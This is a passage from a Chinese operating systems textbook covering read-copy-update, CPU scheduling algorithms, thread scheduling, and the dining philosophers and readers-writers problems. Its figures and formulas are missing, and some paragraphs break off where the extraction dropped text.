RCU 谨慎地决定读操 作持有一个数据结构引用的最大时间。
在这段时间之后，就能安全地将内存回收。
特别地，读者通过读端临 界区访问数据结构，它可以包含任何代码，只要该代码不阻塞或者休眠。
这样的话，就知道了需要等待的最 大时长。
特别地，我们定义一个任意时间段的宽 限 期(grace period),在这个时期内，每个线程至少有一次 在读端临界区之外。
如果等待至少一个宽限期的时间段后进行回收，这一切就会令人满意。
由于读端临界区 中的代码不允许阻塞或者休眠，因此一个简单的准则就是一直等到所有的线程执行完一次上下文切换。
a) 原始的树
b) 初始化节点X, 并将 E与X相连。
A 和E中 的任何读操作都不 会受影响
c)当X 初始化完成后，将X 与A 相连。
此 时X中的读操作将读取树的旧版本， 而A中的读操作将获得树的新版本
移除两个节点：
d) 使 B与A分离开来。
注 意此时B中可能仍然有 读操作，这些读操作 将获得树的旧版本 ， 而当前A中的读操作将 获得树的新版本
e) 等待直到对B和C没 有更多的读操作 ， 此时这些节点将不 再可以访问
f) 现在可以安全地移除B和D
图2-38 读一 复制一更新：在树中插入一个节点，然后移除一个分支，整个过程中都不涉及锁
2.4 调度
当计算机系统是多道程序设计系统时，通常就会有多个进程或线程同时竞争CPU 。
只要有两个或更 多的进程处于就绪状态，这种情形就会发生。
如果只有一个CPU 可用，那么就必须选择下一个要运行的 进程。
在操作系统中，完成选择工作的这一部分称为调 度程序(scheduler),该 程序使用的算法称为调 度算法 (scheduling algorithm)。
尽管有一些不同，但许多适用于进程调度的处理方法也同样适用于线程调度。
当内核管理线程的时 候，调度经常是按线程级别的，与线程所属的进程基本或根本没有关联。
下面我们将首先关注适用于进 程与线程两者的调度问题，然后会明确地介绍线程调度以及它所产生的独特问题。
第8章将讨论多核芯 片的问题。
2.4.1 调度简介
让我们回到早期以磁带上的卡片作为输入的批处理系统时代，那时的调度算法很简单：依次运行磁
在个人计算机出现之后，整个情形向两个方面发展。
首先，在多数时间内只有一个活动进程。
一个用 户进入文字处理软件编辑一个文件时，一般不会同时在后台编译一个程序。
在用户向文字处理软件键入一 条命令时，调度程序不用做多少工作来判定哪个进程要运行——唯一的候选者是文字处理软件。
其次，同CPU 是稀缺资源时的年代相比，现在计算机速度极快。
个人计算机的多数程序受到的是用 户当前输入速率(键入或敲击鼠标)的限制，而不是CPU 处理速率的限制。
即便对于编译(这是过去 CPU周期的主要消耗者)现在大多数情况下也只要花费仅仅几秒钟。
甚至两个实际同时运行的程序，诸 如一个文字处理软件和一个电子表单，由于用户在等待两者完成工作，因此很难说需要哪一个先完成。
这样的结果是，调度程序在简单的PC上并不重要。
当然，总有应用程序会实际消耗掉CPU, 例如，为绘 制一小时高精度视频而调整107892帧 (NTSC 制)或90000帧(PAL 制)中的每一帧颜色就需要大量工 业强度的计算能力。
然而，类似的应用程序不在我们的考虑范围。
“资源充足”这个论据在很多移动设备上也不成立，比如智能手机(可能除了最先进的几款)以及 传感器网络的节点。
这些情况下，CPU 依然薄弱，内存也偏小。
此外，因为电池寿命短是这些设备最重 要的约束之一，所以一些调度算法 (scheduler) 在努力优化电量损耗。
另外，为了选取正确的进程运行，调度程序还要考虑CPU的利用率，因为进程切换的代价是比较高 的。
首先用户态必须切换到内核态；然后要保存当前进程的状态，包括在进程表中存储寄存器值以便以 后重新装载。
在许多系统中，内存映像(例如，页表内的内存访问位)也必须保存；接着，通过运行调 度算法选定一个新进程；之后，应该将新进程的内存映像重新装入MMU; 最后新进程开始运行。
除此 之外，进程切换还要使整个内存高速缓存失效，强迫缓存从内存中动态重新装入两次(进入内核一次， 离开内核一次)。
总之，如果每秒钟切换进程的次数太多，会耗费大量CPU时间，所以有必要提醒注意。
1.进程行为
几乎所有进程的(磁盘或网络)I/O 请求和计算都是交替突发的，如图2-39所示。
典型地，CPU 不 停顿地运行一段时间，然后发出一个系统调用以便读写文件。
在完成系统调用之后，CPU 又开始计算， 直到它需要读更多的数据或写更多的数据为止。
请注意，某些I/O 活动可以看作计算。
例如，当CPU向 视频RAM复制数据以更新屏幕时，因为使用了CPU, 所以这是计算，而不是I/O活动。
按照这种观点， 当一个进程等待外部设备完成工作而被阻塞时，才是I/O活动。
时间 →
图2-39 CPU的突发使用和等待I/O的时期交替出现：a)CPU 密集型进程；b)I/O 密集型进程
图2-39中有一件值得注意的事，即某些进程(图2-39a的进程)花费了绝大多数时间在计算上，而
其他进程(图2-39b的进程)则在等待I/O上花费了绝大多数时间。
前者称为计算密集型(compute-bound), 后者称为I/O 密集型 (I/O-bound) 。
典型的计算密集型进程具有较长时间的CPU 集中使用和较小频度的 I/O等 待 。
I/O 密集型进程具有较短时间的CPU 集中使用和频繁的I/O 等待。
它是I/O 类的，因为这种进程 在I/O请求之间较少进行计算，并不是因为它们有特别长的I/O请求。
在I/O开始后无论处理数据是多还是 少，它们都花费同样的时间提出硬件请求读取磁盘块。
有必要指出，随着CPU 变得越来越快，更多的进程倾向为I/O 密集型。
这种现象之所以发生是因为 CPU的改进比磁盘的改进快得多，其结果是，未来对I/O 密集型进程的调度处理似乎更为重要。
这里的 基本思想是，如果需要运行I/O 密集型进程，那么就应该让它尽快得到机会，以便发出磁盘请求并保持 磁盘始终忙碌。
从图2-6中可以看到，如果进程是I/O 密集型的，则需要多运行一些这类进程以保持CPU 的充分利用。
2.何时调度
有关调度处理的一个关键问题是何时进行调度决策。
存在着需要调度处理的各种情形。
第一，在创建 一个新进程之后，需要决定是运行父进程还是运行子进程。
由于这两种进程都处于就绪状态，所以这是一 种正常的调度决策，可以任意决定，也就是说，调度程序可以合法选择先运行父进程还是先运行子进程。
第二，在一个进程退出时必须做出调度决策。
一个进程不再运行(因为它不再存在),所以必须从 就绪进程集中选择另外某个进程。
如果没有就绪的进程，通常会运行一个系统提供的空闲进程。
第三，当一个进程阻塞在I/O 和信号量上或由于其他原因阻塞时，必须选择另一个进程运行。
有时， 阻塞的原因会成为选择的因素。
例如，如果A是一个重要的进程，并正在等待B退出临界区，让B随后运 行将会使得B 退出临界区，从而可以让A 运行。
不过问题是，通常调度程序并不拥有做出这种相关考虑 的必要信息。
第四，在一个I/O中断发生时，必须做出调度决策。
如果中断来自I/O 设备，而该设备现在完成了工 作，某些被阻塞的等待该I/O的进程就成为可运行的就绪进程了。
是否让新就绪的进程运行，这取决于 调度程序的决定，或者让中断发生时运行的进程继续运行，或者应该让某个其他进程运行。
如果硬件时钟提供50Hz 、60Hz 或其他频率的周期性中断，可以在每个时钟中断或者在每k个时钟中 断时做出调度决策。
根据如何处理时钟中断，可以把调度算法分为两类。
非抢占式调度算法挑选一个进 程，然后让该进程运行直至被阻塞(阻塞在I/O上或等待另一个进程),或者直到该进程自动释放CPU。
即使该进程运行了若干个小时，它也不会被强迫挂起。
这样做的结果是，在时钟中断发生时不会进行调 度。
在处理完时钟中断后，如果没有更高优先级的进程等待到时，则被中断的进程会继续执行。
相反，抢占式调度算法挑选一个进程，并且让该进程运行某个固定时段的最大值。
如果在该时段结 束时，该进程仍在运行，它就被挂起，而调度程序挑选另一个进程运行(如果存在一个就绪进程)。
进 行抢占式调度处理，需要在时间间隔的末端发生时钟中断，以便把CPU 控制返回给调度程序。
如果没有 可用的时钟，那么非抢占式调度就是唯一的选择了。
3.调度算法分类
1)批处理。
2)交互式。
3)实时。
然而在有实时限制的系统中，抢占有时是不需要的，因为进程了解它们可能会长时间得不到运行， 所以通常很快地完成各自的工作并阻塞。
实时系统与交互式系统的差别是，实时系统只运行那些用来推 进现有应用的程序，而交互式系统是通用的，它可以运行任意的非协作甚至是有恶意的程序。
4.调度算法的目标
为了设计调度算法，有必要考虑什么是一个好的 调度算法。
某些目标取决于环境(批处理、交互式或 实时),但是还有一些目标是适用于所有情形的。
在图 2-40中列出了一些目标，我们将在下面逐一讨论。
与公平有关的是系统策略的强制执行。
如果局部 策略是，只要需要就必须运行安全控制进程(即便这 意味着推迟30秒钟发薪),那么调度程序就必须保证 能够强制执行该策略。
另一个共同的目标是保持系统的所有部分尽可能 忙碌。
如果CPU 和所有I/O 设备能够始终运行，那么
图2-40 在不同环境中调度算法的一些目标
相对于让某些部件空转而言，每秒钟就可以完成更多的工作。
例如，在批处理系统中，调度程序控制哪 个作业调入内存运行。
在内存中既有一些CPU 密集型进程又有一些I/O密集型进程是一个较好的想法， 好于先调入和运行所有的CPU 密集型作业，然后在它们完成之后再调入和运行所有I/O 密集型作业的做 法。
如果使用后面一种策略，在CPU密集型进程运行时，它们就要竞争CPU, 而磁盘却在空转。
稍后， 当I/O密集型作业来了之后，它们要为磁盘而竞争，而CPU 又空转了。
显然，通过仔细组合进程，可以 保持整个系统运行得更好一些。
运行大量批处理作业的大型计算中心的管理者们为了掌握其系统的工作状态，通常检查三个指标： 吞吐量、周转时间以及CPU利 用 率 。
吞吐量 (throughout) 是系统每小时完成的作业数量。
把所有的因 素考虑进去之后，每小时完成50个作业好于每小时完成40个作业。
周 转 时 间(turnaround time)是指从 一个批处理作业提交时刻开始直到该作业完成时刻为止的统计平均时间。
该数据度量了用户要得到输出 所需的平均等待时间。
其规则是：小就是好的。
能够使吞吐量最大化的调度算法不一定就有最小的周转时间。
例如，对于确定的短作业和长作业的 一个组合，总是运行短作业而不运行长作业的调度程序，可能会获得出色的吞吐性能(每小时大量的短 作业),但是其代价是对于长的作业周转时间很差。
如果短作业以一个稳定的速率不断到达，长作业可 能根本运行不了，这样平均周转时间是无限长，但是得到了高的吞吐量。
CPU 利用率常常用于对批处理系统的度量。
尽管这样，CPU 利用率并不是一个好的度量参数。
真正 有价值的是，系统每小时可完成多少作业(吞吐量),以及完成作业需要多长时间(周转时间)。
把CPU 利用率作为度量依据，就像用引擎每小时转动了多少次来比较汽车的好坏一样。
另一方面，知道什么时 候CPU利用率接近100%比知道什么时候要求得到更多的计算能力要有用。
一个相关的问题是均 衡 性 。
用户对做一件事情需要多长时间总是有一种固有的(不过通常不正确) 看法。
当认为一个请求很复杂需要较多的时间时，用户会接受这个看法，但是当认为一个请求很简单，
但也需要较多的时间时，用户就会急躁。
例如，如果点击一个图标花费了60秒钟发送完成一份传真，用 户大概会接受这个事实，因为他没有期望花5秒钟得到传真，他知道这需要些时间。
另一方面，当传真发送完成，用户点击断开电话连接的图标时，该用户就有不一样的期待了。
如果 30秒之后还没有完成断开操作，用户就可能会抱怨，而60秒之后，他就要气得要命了。
之所以有这种行 为，其原因是：一般用户认为拿起听筒并建立通话连接所需的时间要比挂掉电话所需的时间长。
在有些 情形下(如本例),调度程序对响应时间指标起不了作用；但是在另外一些情形下，调度程序还是能够 做一些事的，特别是在出现差的进程顺序选择时。
实时系统有着与交互式系统不一样的特性，所以有不同的调度目标。
实时系统的特点是或多或少必 须满足截止时间。
例如，如果计算机正在控制一个以正常速率产生数据的设备，若一个按时运行的数据 收集进程出现失败，会导致数据丢失。
所以，实时系统最主要的要求是满足所有的(或大多数)截止时 间要求。
在多数实时系统中，特别是那些涉及多媒体的实时系统中，可预测性是很重要的。
偶尔不能满足截 止时间要求的问题并不严重，但是如果音频进程运行的错误太多，那么音质就会下降得很快。
视频品质 也是一个问题，但是人的耳朵比眼睛对抖动要敏感得多。
为了避免这些问题，进程调度程序必须是高度 可预测和有规律的。
本章介绍批处理系统和交互式系统中的调度算法。
本书不介绍实时系统的调度算法。
2.4.2 批处理系统中的调度
现在从一般的调度处理问题转向特定的调度算法。
在这一节中，我们将考察在批处理系统中使用的 算法，随后将讨论交互式和实时系统中的调度算法。
有必要指出，某些算法既可以用在批处理系统中， 也可以用在交互式系统中。
我们将稍后讨论这个问题。
这样做的结果是，每个I/O 进程在每秒钟内读到一个磁盘块，要花费1000秒钟才能完成操作。
如果 有一个调度算法每10ms抢占计算密集型进程，那么I/O进程将在10秒钟内完成而不是1000秒钟，而且还 不会对计算密集型进程产生多少延迟。
2.最短作业优先
现在来看一种适用于运行时间可以预知的另一个非抢占式的批处理调度算法。
例如，一家保险公司， 因为每天都做类似的工作，所以人们可以相当精确地预测处理1000个索赔的一批作业需要多少时间。
当 输入队列中有若干个同等重要的作业被启动时，调度程序应使用最短作业优先(shortest job first) 算法， 请看图2-41。
这里有4个作业A 、B 、C 、D, 运行时间分别为8、4、4、4分钟。
若按图中的次序运行，则 A的周转时间为8分钟，B 为12分钟，C 为16分钟，D 为20分钟，平均为14分钟。
现在考虑使用最短作业优先算法运行这4个作业，如图2-41b所示。
目前周转时间分别为4、8、12和 20分钟，平均为11分钟。
可以证明最短作业优先是最优的。
考虑有4个作业的情况，其运行时间分别为a、
b、c、d。
第一个作业在时间a结束，第二个在时间a+b 结束，以此类推。
平均周转时间为(4a+3b+2c+
d)/4 。
显然a对平均值影响最大，所以它应是最短作业，其次是b, 再次是c, 最后的d只影响它自己的周 转时间。
对任意数目作业的情况，道理完全一样。
8 4 4 4 4 4 4 8
a) b)
图2-41 最短作业优先调度的例子：a) 按原有次序运行4个作业；b) 按最短作业优先次序运行
有必要指出，只有在所有的作业都可同时运行的情形下，最短作业优先算法才是最优化的。
作为一 个反例，考虑5个作业，从A到E, 运行时间分别是2、4、1、1和1。
它们的到达时间是0、0、3、3和3。
开始，只能选择A或B, 因为其他三个作业还没有到达。
使用最短作业优先，将按照A 、B 、C 、D 、E的 顺序运行作业，其平均等待时间是4.6。
但是，按照B 、C 、D 、E 、A的顺序运行作业，其平均等待时间 则是4 .4。
3.最短剩余时间优先
2.4.3 交互式系统中的调度
1.轮转调度
一种最古老、最简单、最公平且使用最广的算法是轮转调度 (round robin)。
每个进程被分配一个 时间段，称为时间片(quantum), 即允许该进程在该时间段中运行。
如果在时间片结束时该进程还在运 行，则将剥夺CPU并分配给另一个进程。
如果该进程在时间片结束前阻塞或结束，则CPU立即进行切换。
时间片轮转调度很容易实现，调度程序所要做的就是维护一张可运行进程列表，如图2-42a所示。
当一 个进程用完它的时间片后，就被移到队列的末尾，如图2-42b所示。
时间片轮转调度中唯一有趣的一点是时间片的长度。
从一个进程切换到另一个进程是需要一定时间 进行管理事务处理的——保存和装入寄存器值及内存映像、更新各种表格和列表、清除和重新调入内存 高速缓存等。
假如进程切换 (process switch),有时称为上下文切换 (context switch),需要1ms, 包 括 切换内存映像、清除和重新调入高速缓存等。
再假设时间片设为4ms。
有了这些参数，则CPU 在做完 4ms有用的工作之后，CPU 将花费(即浪费)1ms 来进行进程切换。
因此，CPU 时间的20%浪费在管理开 销上。
很明显，管理时间太多了。
a) b)
图2-42 轮转调度：a) 可运行进程列表；b) 进程B用完时间片后的可运行进程列表
另一个因素是，如果时间片设置长于平均的CPU突发时间，那么不会经常发生抢占。
相反，在时间 片耗费完之前多数进程会完成一个阻塞操作，引起进程的切换。
抢占的消失改善了性能，因为进程切换 只会发生在确实逻辑上有需要的时候，即进程被阻塞不能够继续运行。
可以归结如下结论：时间片设得太短会导致过多的进程切换，降低了CPU 效率；而设得太长又可能 引起对短的交互请求的响应时间变长。
将时间片设为20～50ms 通常是一个比较合理的折中。
2.优先级调度
轮转调度做了一个隐含的假设，即所有的进程同等重要，而拥有和操作多用户计算机系统的人对此 常有不同的看法。
例如，在一所大学里，等级顺序可能是教务长首先，然后是教授、秘书、后勤人员， 最后是学生。
这种将外部因素考虑在内的需要就导致了优先级调度。
其基本思想很清楚：每个进程被赋 予一个优先级，允许优先级最高的可运行进程先运行。
即使在只有一个用户的PC上，也会有多个进程，其中一些比另一些更重要。
例如，与在屏幕上实 时显示视频电影的进程相比，在后台发送电子邮件的守护进程应该被赋予较低的优先级。
为了防止高优先级进程无休止地运行下去，调度程序可能在每个时钟滴答(即每个时钟中断)降低当前 进程的优先级。
如果这一行为导致该进程的优先级低于次高优先级的进程，则进行进程切换。
另一种方法是， 给每个进程赋予一个允许运行的最大时间片，当用完这个时间片时，次高优先级的进程便获得运行机会。
优先级可以是静态赋予或动态赋予。
在一台军用计算机上，可以把将军所启动的进程设为优先级 100,上校为90,少校为80,上尉为70,中尉为60,以此类推。
或者，在一个商业计算中心，高优先级 作业每小时费用为100美元，中优先级每小时75美元，低优先级每小时50美元。
UNIX 系统中有一条命令 nice, 它允许用户为了照顾别人而自愿降低自己进程的优先级，但从未有人用过它。
可以很方便地将一组进程按优先级分成若干类，并 且在各类之间采用优先级调度，而在各类进程的内部采 用轮转调度。
图2-43给出了一个有4类优先级的系统，其 调度算法如下：只要存在优先级为第4类的可运行进程， 就按照轮转法为每个进程运行一个时间片，此时不理会 较低优先级的进程。
若第4类进程为空，则按照轮转法运 行第3类进程。
若第4类和第3类均为空，则按轮转法运行 第2类进程。
如果不偶尔对优先级进行调整，则低优先级 进程很可能会产生饥饿现象。
队列头
优先级4
优先级3 优先级2
优先级1
图2-43
可运行进程
(最高优先级)
(最低优先级)
有4个优先级类的调度算法
3. 多级队列
CTSS(Compatible Time Sharing System),MI.T.在IBM 7094上开发的兼容分时系统 (Corbató 等 人，1962),是最早使用优先级调度的系统之一。
但是在CTSS 中存在进程切换速度太慢的问题，其原因 是IBM 7094内存中只能放进一个进程，每次切换都需要将当前进程换出到磁盘，并从磁盘上读入一个新 进程。
CTSS 的设计者很快便认识到，为CPU 密集型进程设置较长的时间片比频繁地分给它们很短的时 间片要更为高效(减少交换次数)。
另一方面，如前所述，长时间片的进程又会影响到响应时间，其解 决办法是设立优先级类。
属于最高优先级类的进程运行一个时间片，属于次高优先级类的进程运行2个 时间片，再次一级运行4个时间片，以此类推。
当一个进程用完分配的时间片后，它被移到下一类。
作为一个例子，考虑有一个进程需要连续计算100个时间片。
它最初被分配1个时间片，然后被换出。
下次它将获得2个时间片，接下来分别是4、8、16、32和64。
当然最后一次它只使用64个时间片中的37 个便可以结束工作。
该进程需要7次交换(包括最初的装入),而如果采用纯粹的轮转算法则需要100次 交换。
而且，随着进程优先级的不断降低，它的运行频度逐渐放慢，从而为短的交互进程让出CPU。
对于那些刚开始运行一段长时间，而后来又需要交互的进程，为了防止其永远处于被惩罚状态，可 以采取下面的策略。
只要终端上有回车键 (Enter 键)按下，则属于该终端的所有进程就都被移到最高优 先级，这样做的原因是假设此时进程即将需要交互。
但可能有一天， 一台CPU 密集的重载机器上有几个 用户偶然发现，只需坐在那里随机地每隔几秒钟敲一下回车键就可以大大提高响应时间。
于是他们又告 诉他们的朋友…… ·这个故事的寓意是：在实践上可行比理论上可行要困难得多。
4.最短进程优先
对于批处理系统而言，由于最短作业优先常常伴随着最短响应时间，所以如果能够把它用于交互进 程，那将是非常好的。
在某种程度上，的确可以做到这一点。
交互进程通常遵循下列模式：等待命令、 执行命令、等待命令、执行命令，如此不断反复。
如果将每一条命令的执行看作是一个独立的“作业”, 则我们可以通过首先运行最短的作业来使响应时间最短。
这里唯一的问题是如何从当前可运行进程中找 出最短的那一个进程。
T₀,T₀/2+T₁/2,T₀/4+T₁/4+T₂/2,T。
/8+T₁/8+T₂/4+T₃/2
可以看到，在三轮过后，T₀ 在新的估计值中所占的比重下降到1/8。
5.保证调度
一种完全不同的调度算法是向用户作出明确的性能保证，然后去实现它。
一种很实际并很容易实现 的保证是：若用户工作时有n 个用户登录，则用户将获得CPU 处理能力的1/n。
类似地，在 一 个有n个进 程运行的单用户系统中，若所有的进程都等价，则每个进程将获得1/n的CPU时间。
看上去足够公平了。
为了实现所做的保证，系统必须跟踪各个进程自创建以来已使用了多少CPU时间。
然后它计算各个 进程应获得的CPU 时间，即自创建以来的时间除以n 。
由于各个进程实际获得的CPU 时间是已知的，所 以很容易计算出真正获得的CPU时间和应获得的CPU时间之比。
比率为0.5说明一个进程只获得了应得时 间的一半，而比率为2.0则说明它获得了应得时间的2倍。
于是该算法随后转向比率最低的进程，直到该 进程的比率超过它的最接近竞争者为止。
6. 彩票调度
给用户一个保证，然后兑现之，这是个好想法，不过很难实现。
但是，有一个既可给出类似预测结果而 又有非常简单的实现方法的算法，这个算法称为彩票调度(lottery scheduling;Waldspurger和Weihl,1994)。
其基本思想是为进程提供各种系统资源(如CPU时间)的彩票。
一旦需要做出一项调度决策时，就 随机抽出一张彩票，拥有该彩票的进程获得该资源。
在应用到CPU 调度时，系统可以掌握每秒钟50次的 一种彩票，作为奖励每个获奖者可以得到20ms 的CPU时间。
彩票调度具有若干有趣的性质。
例如，如果有一个新的进程出现并得到一些彩票，那么在下一次的
抽奖中，该进程会有同它持有彩票数量成比例的机会赢得奖励。
换句话说，彩票调度是反应迅速的。
7.公平分享调度
到现在为止，我们假设被调度的都是各个进程自身，并不关注其所有者是谁。
这样做的结果是，如 果用户1启动9个进程而用户2启动1个进程，使用轮转或相同优先级调度算法，那么用户1将得到90%的 CPU时间，而用户2只得到10%的CPU时间。
为了避免这种情形，某些系统在调度处理之前考虑谁拥有进程这一因素。
在这种模式中，每个用户 分配到CPU时间的一部分，而调度程序以一种强制的方式选择进程。
这样，如果两个用户都得到获得 50%CPU 时间的保证，那么无论一个用户有多少进程存在，每个用户都会得到应有的CPU份额。
作为一个例子，考虑有两个用户的一个系统，每个用户都保证获得50%CPU 时间。
用户1有4个进程
A 、B 、C和D, 而用户2只有1个进程E。
如果采用轮转调度，一个满足所有限制条件的可能序列是：
AEBECEDEAEBECEDE …
另一方面，如果用户1得到比用户2两倍的CPU时间，我们会有
A BECDEA BECDE …
当然，大量其他的可能也存在，可以进一步探讨，这取决于如何定义公平的含义。
2.4.4 实时系统中的调度
实时系统通常可以分为硬实时(hard real time) 和软实时 (soft real time), 前者的含义是必须满足 绝对的截止时间，后者的含义是虽然不希望偶尔错失截止时间，但是可以容忍。
在这两种情形中，实时 性能都是通过把程序划分为一组进程而实现的，其中每个进程的行为是可预测和提前掌握的。
这些进程 一般寿命较短，并且极快地运行完成。
在检测到一个外部信号时，调度程序的任务就是按照满足所有截 止时间的要求调度进程。
实时系统中的事件可以按照响应方式进一步分类为周期性 (以规则的时间间隔发生)事件或非周期 性(发生时间不可预知)事件。
一个系统可能要响应多个周期性事件流。
根据每个事件需要处理时间的 长短，系统甚至有可能无法处理完所有的事件。
例如，如果有m个周期事件，事件似周期P, 发生，并需 要C秒CPU时间处理一个事件，那么可以处理负载的条件是
满足这个条件的实时系统称为是可调度的，这意味着它实际上能够被实现。
一个不满足此检验标准的进 程不能被调度，因为这些进程共同需要的CPU时间总和大于CPU能提供的时间。
实时系统的调度算法可以是静态或动态的。
前者在系统开始运行之前作出调度决策；后者在运行过 程中进行调度决策。
只有在可以提前掌握所完成的工作以及必须满足的截止时间等全部信息时，静态调 度才能工作，而动态调度算法不需要这些限制。
2.4.5 策略和机制
到目前为止，我们隐含地假设系统中所有进程分属不同的用户，并且，进程间相互竞争CPU。
通 常 情况下确实如此，但有时也有这样的情况： 一个进程有许多子进程并在其控制下运行。
例如， 一个数据 库管理系统可能有许多子进程，每一个子进程可能处理不同的请求，或每一个子进程实现不同的功能 (如请求分析，磁盘访问等)。
主进程完全可能掌握哪一个子进程最重要(或最紧迫)而哪一个最不重要。
但是，以上讨论的调度算法中没有一个算法从用户进程接收有关的调度决策信息，这就导致了调度程序 很少能够做出最优的选择。
解决问题的方法是将调度机制 (scheduling mechanism) 与调度策略 (scheduling policy) 分离这个 一贯的原则 (Levin 等人，1975)。
也就是将调度算法以某种形式参数化，而参数可以由用户进程填写。
再次考虑数据库的例子。
假设内核使用优先级调度算法，并提供了一条可供进程设置(并改变)优先级 的系统调用。
这样，尽管父进程本身并不参与调度，但它可以控制如何调度子进程的细节。
在这里，调 度机制位于内核，而调度策略则由用户进程决定。
策略与机制分离是一种关键性思路。
2.4.6 线程调度
当若干进程都有多个线程时，就存在两个层次的并行：进程和线程。
在这样的系统中调度处理有本 质差别，这取决于所支持的是用户级线程还是内核级线程(或两者都支持)。
首先考虑用户级线程。
由于内核并不知道有线程存在，所以内核还是和以前一样地操作，选取一个 进程，假设为A, 并给予A以时间片控制。
A中的线程调度程序决定哪个线程运行，假设为A1。
由 于 多 道线程并不存在时钟中断，所以这个线程可以按其意愿任意运行多长时间。
如果该线程用完了进程的全 部时间片，内核就会选择另一个进程运行。
在进程A终于又一次运行时，线程A1会接着运行。
该线程会继续耗费A进程的所有时间，直到它完 成工作。
不过，该线程的这种不合群的行为不会影响到其他的进程。
其他进程会得到调度程序所分配的 合适份额，不会考虑进程A内部所发生的事。
现在考虑A线程每次CPU 计算的工作比较少的情况，例如，在50ms 的时间片中有5ms 的计算工作。
于是，每个线程运行一会儿，然后把CPU 交回给线程调度程序。
这样在内核切换到进程B之前，就会有 序列A1,A2,A3,A1,A2,A3,A1,A2,A3,A1 。
这种情形可用图2-44a表示。
a)
可能：A1,A2,A3,A1,A2,A3
不可能：A1,B1,A2,B2,A3,B3
b)
图2-44 a) 用户级线程的可能调度，有50ms时间片的进程以及每次运行5ms CPU的 线 程 ；b) 与a) 有相同 特性的内核级线程的可能调度
运行时系统使用的调度算法可以是上面介绍的算法中的任意一种。
从实用考虑，轮转调度和优先级 调度更为常用。
唯一的局限是，缺乏一个时钟中断运行过长的线程，但由于线程之间的合作关系，这通
常也不是问题。
现在考虑使用内核级线程的情形。
内核选择一个特定的线程运行。
它不用考虑该线程属于哪个进程， 不过如果有必要的话，它可以这样做。
对被选择的线程赋予一个时间片，而且如果超过了时间片，就会 强制挂起该线程。
一个线程在50ms的时间片内，5ms 之后被阻塞，在30ms的时间段中，线程的顺序会是 A1,B1,A2,B2,A3,B3, 在这种参数和用户线程状态下，有些情形是不可能出现的。
这种情形部分 通过图2-44b刻画。
用户级线程和内核级线程之间的差别在于性能。
用户级线程的线程切换需要少量的机器指令，而内 核级线程需要完整的上下文切换，修改内存映像，使高速缓存失效，这导致了若干数量级的延迟。
另一 方面，在使用内核级线程时， 一旦线程阻塞在I/O上就不需要像在用户级线程中那样将整个进程挂起。
从进程A的一个线程切换到进程B的一个线程，其代价高于运行进程A的第2个线程(因为必须修改 内存映像，清除内存高速缓存的内容),内核对此是了解的，并可运用这些信息做出决定。
例如，给定 两个在其他方面同等重要的线程，其中一个线程与刚好阻塞的线程属于同一个进程，而另一个线程属于 其他的进程，那么应该倾向前者。
2.5 经典的IPC 问题
操作系统文献中有许多广为讨论和分析的有趣问题，它们与同步方法的使用相关。
以下几节将讨论 其中两个最著名的问题。
2.5.1 哲学家就餐问题
1965年，Dijkstra 提出并解决了一个他称之为哲学家就餐的同步问题。
从那时起，每个发明新的同步 原语的人都希望通过解决哲学家就餐问题来展示其同步原语的精妙之处。
这个问题可以简单地描述如下： 五个哲学家围坐在一张圆桌周围，每个哲学家面前都有一盘通心粉。
由于通心粉很滑，所以需要两把叉 子才能夹住。
相邻两个盘子之间放有一把叉子，餐桌如图2-45所示。
哲学家的生活中有两种交替活动时段：即吃饭和思考(这只是一种抽象，即对哲学家而言其他活动 都无关紧要)。
当一个哲学家觉得饿了时，他就试图分两
次去取其左边和右边的叉子，每次拿一把，但不分次序。
如果成功地得到了两把叉子，就开始吃饭，吃完后放下叉 子继续思考。
关键问题是：能为每一个哲学家写一段描述 其行为的程序，且决不会死锁吗?
(要求拿两把叉子是人 为规定的，也可以将意大利面条换成中国菜，用米饭代替 通心粉，用筷子代替叉子。
)
图2-46给出了一种直观的解法。
过程take_fork 将一直等 到所指定的叉子可用，然后将其取用。
不过，这种显然的解 法是错误的。
如果五位哲学家同时拿起左面的叉子，就没有 人能够拿到他们右面的叉子，于是发生死锁。
可以将这个程序修改一下，这样在拿到左叉后，程序要 查看右面的叉子是否可用。
如果不可用，则该哲学家先放下左 叉，等一段时间，再重复整个过程。
但这种解法也是错误的， 尽管与前一种原因不同。
可能在某一个瞬间，所有的哲学家都
同时开始这个算法，拿起其左叉，看到右叉不可用，又都放下
左叉，等一会儿，又同时拿起左叉，如此这样永远重复下去。
对于这种情况，所有的程序都在不停地运行，但 都无法取得进展，就称为饥饿 (starvation)。
(即使问题不发生在意大利餐馆或中国餐馆，也被称为饥饿。
)
图2-46 哲学家就餐问题的一种错误解法
现在读者可能会想，“如果哲学家在拿不到右边叉子时等待一段随机时间，而不是等待相同的时间，这样 发生互锁的可能性就很小了，事情就可以继续了。
”这种想法是对的，而且在几乎所有的应用程序中，稍后再 试的办法并不会演化成为一个问题。
例如，在流行的局域网以太网中，如果两台计算机同时发送包，那么每台 计算机等待一段随机时间之后再尝试。
在实践中，该方案工作良好。
但是，在少数的应用中，人们希望有一种 能够始终工作的方案，它不能因为一串不可靠的随机数字而导致失败(想象一下核电站中的安全控制系统)。
图2-47 哲学家就餐问题的一个解法
对图2-46中的算法可做如下改进，它既不会发生死锁又不会产生饥饿：使用一个二元信号量对调用 think 之后的五个语句进行保护。
在开始拿叉子之前，哲学家先对互斥量mutex 执行down 操作。
在放回 叉子后，他再对mutex 执行up 操作。
从理论上讲，这种解法是可行的。
但从实际角度来看，这里有性能 上的局限：在任何一时刻只能有一位哲学家进餐。
而五把叉子实际上可以允许两位哲学家同时进餐。
图2-47中的解法不仅没有死锁，而且对于任意位哲学家的情况都能获得最大的并行度。
算法中使用 一个数组state 跟踪每一个哲学家是在进餐、思考还是饥饿状态(正在试图拿叉子)。
一个哲学家只有在 两个邻居都没有进餐时才允许进入到进餐状态。
第个哲学家的邻居则由宏LEFT和RIGHT定义，换言之， 若i为2,则LEFT为1,RIGHT 为3。
该程序使用了一个信号量数组，每个信号量对应一位哲学家，这样在所需的叉子被占用时，想进餐 的哲学家就被阻塞。
注意，每个进程将过程philosopher 作为主代码运行，而其他过程take_forks、
put_forks 和test 只是普通的过程，而非单独的进程。
2.5.2 读者一写者问题
哲学家就餐问题对于互斥访问有限资源的竞争问题(如I/O 设备)一类的建模过程十分有用。
另一 个著名的问题是读者一写者问题(Courtois 等人，1971),它为数据库访问建立了一个模型。
例如，设想 一个飞机订票系统，其中有许多竞争的进程试图读写其中的数据。
多个进程同时读数据库是可以接受的， 但如果一个进程正在更新(写)数据库，则所有的其他进程都不能访问该数据库，即使读操作也不行。
这里的问题是如何对读者和写者进行编程?
